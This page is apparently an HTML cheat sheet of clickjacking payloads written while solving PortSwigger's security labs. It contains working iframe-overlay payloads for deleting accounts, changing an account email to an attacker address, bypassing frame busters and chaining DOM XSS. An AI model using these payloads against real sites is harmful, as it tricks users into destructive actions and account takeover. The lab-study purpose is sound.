@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="pandoc" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+  <title>ClickJacking</title>
+  <link rel="stylesheet" href="/statics/style.css">
+
+  
+</head>
+<body>
+<header id="title-block-header">
+</header>
+<h1 id="clickjacking">Clickjacking</h1>
+<h2 id="summary">Summary</h2>
+<ul>
+<li><a href="#recon">Recon for Clickjacking</a></li>
+<li><a href="#cheat-sheet">Portswigger Labs Cheat Sheet /
+Payloads</a></li>
+</ul>
+<p><br></p>
+<h2 id="resources">Resources</h2>
+<ul>
+<li>https://portswigger.net/web-security/clickjacking</li>
+<li>https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html</li>
+</ul>
+<p><br></p>
+<h2 id="recon">Recon</h2>
+<ul>
+<li><p>Identify if the application’s responses contain the following
+headers:</p>
+<ul>
+<li><p>X-Frame-Options: <em>value</em></p></li>
+<li><p>Content-Security-Policy: frame-ancestors <em>value</em></p></li>
+</ul></li>
+<li><p>If the responses do not contain these headers, then the
+application is most likely vulnerable to clickjacking.</p></li>
+<li><p>More Resources:</p>
+<ul>
+<li><p>https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options</p></li>
+<li><p>https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy</p></li>
+</ul></li>
+</ul>
+<p><br></p>
+<p><br></p>
+<h2 id="cheat-sheet">Cheat Sheet</h2>
+<p><br></p>
+<h3 id="basic-clickjacking">Basic Clickjacking:</h3>
+<ul>
+<li><p>Use a basic clickjacking payload, that loads the vulnerable
+application’s page in an &lt;iframe&gt;, which contains a button to
+delete the user’s account. We can use this method to trick a user into
+clicking on the “Delete account” button on the targeted application.</p>
+<ul>
+<li><p>For Example: height: 700px , weight: 500px , opacity: 0.1 , top:
+500px , left: 100px</p></li>
+<li><p>Also for the labs, the “Test me” text needed to be changed to
+“Click me”.</p></li>
+</ul></li>
+</ul>
+<div class="sourceCode" id="cb1"><pre
+class="sourceCode html"><code class="sourceCode html"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">style</span><span class="dt">&gt;</span></span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a>    iframe {</span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a>        <span class="kw">position</span><span class="ch">:</span><span class="dv">relative</span><span class="op">;</span></span>
+<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a>        <span class="kw">width</span><span class="ch">:</span> <span class="dv">500</span><span class="dt">px</span><span class="op">;</span></span>
+<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a>        <span class="kw">height</span><span class="ch">:</span> <span class="dv">700</span><span class="dt">px</span><span class="op">;</span></span>
+<span id="cb1-6"><a href="#cb1-6" aria-hidden="true" tabindex="-1"></a>        <span class="kw">opacity</span><span class="ch">:</span> <span class="dv">0.1</span><span class="op">;</span></span>
+<span id="cb1-7"><a href="#cb1-7" aria-hidden="true" tabindex="-1"></a>        <span class="kw">z-index</span><span class="ch">:</span> <span class="dv">2</span><span class="op">;</span></span>
+<span id="cb1-8"><a href="#cb1-8" aria-hidden="true" tabindex="-1"></a>    }</span>
+<span id="cb1-9"><a href="#cb1-9" aria-hidden="true" tabindex="-1"></a>    div {</span>
+<span id="cb1-10"><a href="#cb1-10" aria-hidden="true" tabindex="-1"></a>        <span class="kw">position</span><span class="ch">:</span><span class="dv">absolute</span><span class="op">;</span></span>
+<span id="cb1-11"><a href="#cb1-11" aria-hidden="true" tabindex="-1"></a>        <span class="kw">top</span><span class="ch">:</span> <span class="dv">495</span><span class="dt">px</span><span class="op">;</span></span>
+<span id="cb1-12"><a href="#cb1-12" aria-hidden="true" tabindex="-1"></a>        <span class="kw">left</span><span class="ch">:</span> <span class="dv">70</span><span class="dt">px</span><span class="op">;</span></span>
+<span id="cb1-13"><a href="#cb1-13" aria-hidden="true" tabindex="-1"></a>        <span class="kw">z-index</span><span class="ch">:</span> <span class="dv">1</span><span class="op">;</span></span>
+<span id="cb1-14"><a href="#cb1-14" aria-hidden="true" tabindex="-1"></a>    }</span>
+<span id="cb1-15"><a href="#cb1-15" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;/</span><span class="kw">style</span><span class="dt">&gt;</span></span>
+<span id="cb1-16"><a href="#cb1-16" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">div</span><span class="dt">&gt;</span>Click me<span class="dt">&lt;/</span><span class="kw">div</span><span class="dt">&gt;</span></span>
+<span id="cb1-17"><a href="#cb1-17" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">iframe</span><span class="ot"> src</span><span class="op">=</span><span class="st">&quot;$VULNERABLE-APPLICATION-URL&quot;</span><span class="dt">&gt;&lt;/</span><span class="kw">iframe</span><span class="dt">&gt;</span></span></code></pre></div>
+<p><br></p>
+<h3
+id="clickjacking---prepopulate-post-form-with-query-parameters">Clickjacking
+- Prepopulate POST Form with Query Parameters</h3>
+<ul>
+<li><p>It may be possible to prepopulate a form used in a POST request,
+by referencing those body parameters as query parameters in a GET
+request.</p></li>
+<li><p>Use a clickjacking payload, which will prepopulate a &lt;form&gt;
+parameter’s values, by using query parameters in a GET request.</p></li>
+<li><p>Include this targeted web page in an &lt;iframe&gt;. Since the
+form will be prepopulated, we only need to induce the user into clicking
+on the button that will submit the POST request.</p>
+<ul>
+<li><p>For Example: height: 700px , weight: 500px , opacity: 0.1 , top:
+500px , left: 100px</p></li>
+<li><p>Also for the labs, the “Test me” text needed to be changed to
+“Click me”.</p></li>
+</ul></li>
+</ul>
+<div class="sourceCode" id="cb2"><pre
+class="sourceCode html"><code class="sourceCode html"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">style</span><span class="dt">&gt;</span></span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a>    iframe {</span>
+<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a>        <span class="kw">position</span><span class="ch">:</span><span class="dv">relative</span><span class="op">;</span></span>
+<span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a>        <span class="kw">width</span><span class="ch">:</span> <span class="dv">500</span><span class="dt">px</span><span class="op">;</span></span>
+<span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a>        <span class="kw">height</span><span class="ch">:</span> <span class="dv">700</span><span class="dt">px</span><span class="op">;</span></span>
+<span id="cb2-6"><a href="#cb2-6" aria-hidden="true" tabindex="-1"></a>        <span class="kw">opacity</span><span class="ch">:</span> <span class="dv">0.1</span><span class="op">;</span></span>
+<span id="cb2-7"><a href="#cb2-7" aria-hidden="true" tabindex="-1"></a>        <span class="kw">z-index</span><span class="ch">:</span> <span class="dv">2</span><span class="op">;</span></span>
+<span id="cb2-8"><a href="#cb2-8" aria-hidden="true" tabindex="-1"></a>    }</span>
+<span id="cb2-9"><a href="#cb2-9" aria-hidden="true" tabindex="-1"></a>    div {</span>
+<span id="cb2-10"><a href="#cb2-10" aria-hidden="true" tabindex="-1"></a>        <span class="kw">position</span><span class="ch">:</span><span class="dv">absolute</span><span class="op">;</span></span>
+<span id="cb2-11"><a href="#cb2-11" aria-hidden="true" tabindex="-1"></a>        <span class="kw">top</span><span class="ch">:</span> <span class="dv">440</span><span class="dt">px</span><span class="op">;</span></span>
+<span id="cb2-12"><a href="#cb2-12" aria-hidden="true" tabindex="-1"></a>        <span class="kw">left</span><span class="ch">:</span> <span class="dv">80</span><span class="dt">px</span><span class="op">;</span></span>
+<span id="cb2-13"><a href="#cb2-13" aria-hidden="true" tabindex="-1"></a>        <span class="kw">z-index</span><span class="ch">:</span> <span class="dv">1</span><span class="op">;</span></span>
+<span id="cb2-14"><a href="#cb2-14" aria-hidden="true" tabindex="-1"></a>    }</span>
+<span id="cb2-15"><a href="#cb2-15" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;/</span><span class="kw">style</span><span class="dt">&gt;</span></span>
+<span id="cb2-16"><a href="#cb2-16" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">div</span><span class="dt">&gt;</span>Click me<span class="dt">&lt;/</span><span class="kw">div</span><span class="dt">&gt;</span></span>
+<span id="cb2-17"><a href="#cb2-17" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">iframe</span><span class="ot"> src</span><span class="op">=</span><span class="st">&quot;$VULNERABLE-APPLICATION-URL?email=hacker@attacker-website.com&quot;</span><span class="dt">&gt;&lt;/</span><span class="kw">iframe</span><span class="dt">&gt;</span></span></code></pre></div>
+<p><br></p>
+<h3 id="prepopulate-form-frame-buster-script-bypass">Prepopulate Form +
+Frame Buster Script Bypass</h3>
+<ul>
+<li><p>It may be possible to prepopulate a form used in a POST request,
+by referencing those body parameters as query parameters in a GET
+request.</p></li>
+<li><p>Use a clickjacking payload, which will prepopulate a &lt;form&gt;
+parameter’s value, using a query parameter in a GET request.</p></li>
+<li><p>Include this targeted web page in an &lt;iframe&gt; with the
+attribute <strong>‘sandbox=“allow-forms”’</strong>, this will neutralize
+the frame buster script . Since the form will be prepopulated, we only
+need to induce the user into clicking on the button that will submit the
+POST request.</p>
+<ul>
+<li><p>For Example: height: 700px , weight: 500px , opacity: 0.1 , top:
+500px , left: 100px</p></li>
+<li><p>Also for the labs, the “Test me” text needed to be changed to
+“Click me”.</p></li>
+</ul></li>
+</ul>
+<div class="sourceCode" id="cb3"><pre
+class="sourceCode html"><code class="sourceCode html"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">style</span><span class="dt">&gt;</span></span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a>    iframe {</span>
+<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a>        <span class="kw">position</span><span class="ch">:</span><span class="dv">relative</span><span class="op">;</span></span>
+<span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a>        <span class="kw">width</span><span class="ch">:</span> <span class="dv">500</span><span class="dt">px</span><span class="op">;</span></span>
+<span id="cb3-5"><a href="#cb3-5" aria-hidden="true" tabindex="-1"></a>        <span class="kw">height</span><span class="ch">:</span> <span class="dv">700</span><span class="dt">px</span><span class="op">;</span></span>
+<span id="cb3-6"><a href="#cb3-6" aria-hidden="true" tabindex="-1"></a>        <span class="kw">opacity</span><span class="ch">:</span> <span class="dv">0.1</span><span class="op">;</span></span>
+<span id="cb3-7"><a href="#cb3-7" aria-hidden="true" tabindex="-1"></a>        <span class="kw">z-index</span><span class="ch">:</span> <span class="dv">2</span><span class="op">;</span></span>
+<span id="cb3-8"><a href="#cb3-8" aria-hidden="true" tabindex="-1"></a>    }</span>
+<span id="cb3-9"><a href="#cb3-9" aria-hidden="true" tabindex="-1"></a>    div {</span>
+<span id="cb3-10"><a href="#cb3-10" aria-hidden="true" tabindex="-1"></a>        <span class="kw">position</span><span class="ch">:</span><span class="dv">absolute</span><span class="op">;</span></span>
+<span id="cb3-11"><a href="#cb3-11" aria-hidden="true" tabindex="-1"></a>        <span class="kw">top</span><span class="ch">:</span> <span class="dv">450</span><span class="dt">px</span><span class="op">;</span></span>
+<span id="cb3-12"><a href="#cb3-12" aria-hidden="true" tabindex="-1"></a>        <span class="kw">left</span><span class="ch">:</span> <span class="dv">80</span><span class="dt">px</span><span class="op">;</span></span>
+<span id="cb3-13"><a href="#cb3-13" aria-hidden="true" tabindex="-1"></a>        <span class="kw">z-index</span><span class="ch">:</span> <span class="dv">1</span><span class="op">;</span></span>
+<span id="cb3-14"><a href="#cb3-14" aria-hidden="true" tabindex="-1"></a>    }</span>
+<span id="cb3-15"><a href="#cb3-15" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;/</span><span class="kw">style</span><span class="dt">&gt;</span></span>
+<span id="cb3-16"><a href="#cb3-16" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">div</span><span class="dt">&gt;</span>Click me<span class="dt">&lt;/</span><span class="kw">div</span><span class="dt">&gt;</span></span>
+<span id="cb3-17"><a href="#cb3-17" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">iframe</span><span class="ot"> sandbox</span><span class="op">=</span><span class="st">&quot;allow-forms&quot;</span></span>
+<span id="cb3-18"><a href="#cb3-18" aria-hidden="true" tabindex="-1"></a><span class="ot">src</span><span class="op">=</span><span class="st">&quot;$VULNERABLE-APPLICATION-URL?email=hacker@attacker-website.com&quot;</span><span class="dt">&gt;&lt;/</span><span class="kw">iframe</span><span class="dt">&gt;</span></span></code></pre></div>
+<p><br></p>
+<h3 id="prepopulate-form-dom-xss-exploit">Prepopulate Form + DOM XSS
+Exploit</h3>
+<ul>
+<li><p>It may be possible to prepopulate a form used in a POST request,
+by referencing those body parameters as query parameters in a GET
+request.</p></li>
+<li><p>Use a clickjacking payload, which will prepopulate a &lt;form&gt;
+parameter’s value, using query parameters in a GET request.</p></li>
+<li><p>One of these parameters will include a XSS payload, as a
+client-side script on the application is using the parameter’s value in
+a dangerous Sink (innerHTML()). Combining both clickjacking and XSS
+leads to a higher impact. Without the clickjacking vulnerability, the
+XSS would be more difficult to pull off since the form requires a CSRF
+Token.</p></li>
+<li><p>Include this targeted web page in an &lt;iframe&gt;. Since the
+form will be prepopulated, we only need to induce the user into clicking
+on the button that will submit the POST request.</p>
+<ul>
+<li><p>For Example: height: 700px , weight: 500px , opacity: 0.1 , top:
+500px , left: 100px</p></li>
+<li><p>Also for the labs, the “Test me” text needed to be changed to
+“Click me”.</p></li>
+</ul></li>
+</ul>
+<div class="sourceCode" id="cb4"><pre
+class="sourceCode html"><code class="sourceCode html"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">style</span><span class="dt">&gt;</span></span>
+<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a>    iframe {</span>
+<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a>        <span class="kw">position</span><span class="ch">:</span><span class="dv">relative</span><span class="op">;</span></span>
+<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a>        <span class="kw">width</span><span class="ch">:</span> <span class="dv">500</span><span class="dt">px</span><span class="op">;</span></span>
+<span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a>        <span class="kw">height</span><span class="ch">:</span> <span class="dv">700</span><span class="dt">px</span><span class="op">;</span></span>
+<span id="cb4-6"><a href="#cb4-6" aria-hidden="true" tabindex="-1"></a>        <span class="kw">opacity</span><span class="ch">:</span> <span class="dv">0.1</span><span class="op">;</span></span>
+<span id="cb4-7"><a href="#cb4-7" aria-hidden="true" tabindex="-1"></a>        <span class="kw">z-index</span><span class="ch">:</span> <span class="dv">2</span><span class="op">;</span></span>
+<span id="cb4-8"><a href="#cb4-8" aria-hidden="true" tabindex="-1"></a>    }</span>
+<span id="cb4-9"><a href="#cb4-9" aria-hidden="true" tabindex="-1"></a>    div {</span>
+<span id="cb4-10"><a href="#cb4-10" aria-hidden="true" tabindex="-1"></a>        <span class="kw">position</span><span class="ch">:</span><span class="dv">absolute</span><span class="op">;</span></span>
+<span id="cb4-11"><a href="#cb4-11" aria-hidden="true" tabindex="-1"></a>        <span class="kw">top</span><span class="ch">:</span> <span class="dv">610</span><span class="dt">px</span><span class="op">;</span></span>
+<span id="cb4-12"><a href="#cb4-12" aria-hidden="true" tabindex="-1"></a>        <span class="kw">left</span><span class="ch">:</span> <span class="dv">80</span><span class="dt">px</span><span class="op">;</span></span>
+<span id="cb4-13"><a href="#cb4-13" aria-hidden="true" tabindex="-1"></a>        <span class="kw">z-index</span><span class="ch">:</span> <span class="dv">1</span><span class="op">;</span></span>
+<span id="cb4-14"><a href="#cb4-14" aria-hidden="true" tabindex="-1"></a>    }</span>
+<span id="cb4-15"><a href="#cb4-15" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;/</span><span class="kw">style</span><span class="dt">&gt;</span></span>
+<span id="cb4-16"><a href="#cb4-16" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">div</span><span class="dt">&gt;</span>Click me<span class="dt">&lt;/</span><span class="kw">div</span><span class="dt">&gt;</span></span>
+<span id="cb4-17"><a href="#cb4-17" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">iframe</span></span>
+<span id="cb4-18"><a href="#cb4-18" aria-hidden="true" tabindex="-1"></a><span class="ot">src</span><span class="op">=</span><span class="st">&quot;$VULNERABLE-APPLICATION-URL?name=</span><span class="er">&lt;</span><span class="st">img src=1 onerror=print()&gt;</span><span class="er">&amp;</span><span class="st">email=hacker@attacker-website.com</span><span class="er">&amp;</span><span class="st">subject=test</span><span class="er">&amp;</span><span class="st">message=test#feedbackResult&quot;</span><span class="dt">&gt;&lt;/</span><span class="kw">iframe</span><span class="dt">&gt;</span></span></code></pre></div>
+<p><br></p>
+<h3 id="step-clickjacking-attack">2-Step Clickjacking Attack</h3>
+<ul>
+<li><p>Use a basic clickjacking payload, that loads the vulnerable
+application’s page in an &lt;iframe&gt;, which contains a button to
+delete the user’s account. We can use this method to trick a user into
+clicking on the “Delete account” button, then confirm the action by
+clicking on another button on the targeted application.</p>
+<ul>
+<li>For Example: height: 700px , weight: 500px , opacity: 0.1 , top:
+500px , left: 100px</li>
+</ul></li>
+</ul>
+<div class="sourceCode" id="cb5"><pre
+class="sourceCode html"><code class="sourceCode html"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">style</span><span class="dt">&gt;</span></span>
+<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a>    iframe {</span>
+<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a>        <span class="kw">position</span><span class="ch">:</span><span class="dv">relative</span><span class="op">;</span></span>
+<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a>        <span class="kw">width</span><span class="ch">:</span> <span class="dv">500</span><span class="dt">px</span><span class="op">;</span></span>
+<span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a>        <span class="kw">height</span><span class="ch">:</span> <span class="dv">700</span><span class="dt">px</span><span class="op">;</span></span>
+<span id="cb5-6"><a href="#cb5-6" aria-hidden="true" tabindex="-1"></a>        <span class="kw">opacity</span><span class="ch">:</span> <span class="dv">0.1</span><span class="op">;</span></span>
+<span id="cb5-7"><a href="#cb5-7" aria-hidden="true" tabindex="-1"></a>        <span class="kw">z-index</span><span class="ch">:</span> <span class="dv">2</span><span class="op">;</span></span>
+<span id="cb5-8"><a href="#cb5-8" aria-hidden="true" tabindex="-1"></a>    }</span>
+<span id="cb5-9"><a href="#cb5-9" aria-hidden="true" tabindex="-1"></a>   <span class="fu">.firstClick</span><span class="op">,</span> <span class="fu">.secondClick</span> {</span>
+<span id="cb5-10"><a href="#cb5-10" aria-hidden="true" tabindex="-1"></a>        <span class="kw">position</span><span class="ch">:</span><span class="dv">absolute</span><span class="op">;</span></span>
+<span id="cb5-11"><a href="#cb5-11" aria-hidden="true" tabindex="-1"></a>        <span class="kw">top</span><span class="ch">:</span> <span class="dv">500</span><span class="dt">px</span><span class="op">;</span></span>
+<span id="cb5-12"><a href="#cb5-12" aria-hidden="true" tabindex="-1"></a>        <span class="kw">left</span><span class="ch">:</span> <span class="dv">50</span><span class="dt">px</span><span class="op">;</span></span>
+<span id="cb5-13"><a href="#cb5-13" aria-hidden="true" tabindex="-1"></a>        <span class="kw">z-index</span><span class="ch">:</span> <span class="dv">1</span><span class="op">;</span></span>
+<span id="cb5-14"><a href="#cb5-14" aria-hidden="true" tabindex="-1"></a>    }</span>
+<span id="cb5-15"><a href="#cb5-15" aria-hidden="true" tabindex="-1"></a>   <span class="fu">.secondClick</span> {</span>
+<span id="cb5-16"><a href="#cb5-16" aria-hidden="true" tabindex="-1"></a>        <span class="kw">top</span><span class="ch">:</span> <span class="dv">290</span><span class="dt">px</span><span class="op">;</span></span>
+<span id="cb5-17"><a href="#cb5-17" aria-hidden="true" tabindex="-1"></a>        <span class="kw">left</span><span class="ch">:</span> <span class="dv">225</span><span class="dt">px</span><span class="op">;</span></span>
+<span id="cb5-18"><a href="#cb5-18" aria-hidden="true" tabindex="-1"></a>    }</span>
+<span id="cb5-19"><a href="#cb5-19" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;/</span><span class="kw">style</span><span class="dt">&gt;</span></span>
+<span id="cb5-20"><a href="#cb5-20" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">div</span><span class="ot"> class</span><span class="op">=</span><span class="st">&quot;firstClick&quot;</span><span class="dt">&gt;</span>Click me first<span class="dt">&lt;/</span><span class="kw">div</span><span class="dt">&gt;</span></span>
+<span id="cb5-21"><a href="#cb5-21" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">div</span><span class="ot"> class</span><span class="op">=</span><span class="st">&quot;secondClick&quot;</span><span class="dt">&gt;</span>Click me next<span class="dt">&lt;/</span><span class="kw">div</span><span class="dt">&gt;</span></span>
+<span id="cb5-22"><a href="#cb5-22" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">iframe</span><span class="ot"> src</span><span class="op">=</span><span class="st">&quot;$VULNERABLE-APPLICATION-URL&quot;</span><span class="dt">&gt;&lt;/</span><span class="kw">iframe</span><span class="dt">&gt;</span></span></code></pre></div>
+<p><br><br><br></p>
+<h3
+id="pending-to-complete-labs-that-are-missing-from-cheat-sheet">Pending
+to complete labs that are missing from cheat sheet:</h3>
+<ul>
+<li>All labs in this category are completed and referenced in cheat
+sheet.</li>
+</ul>
+</body>
+</html>
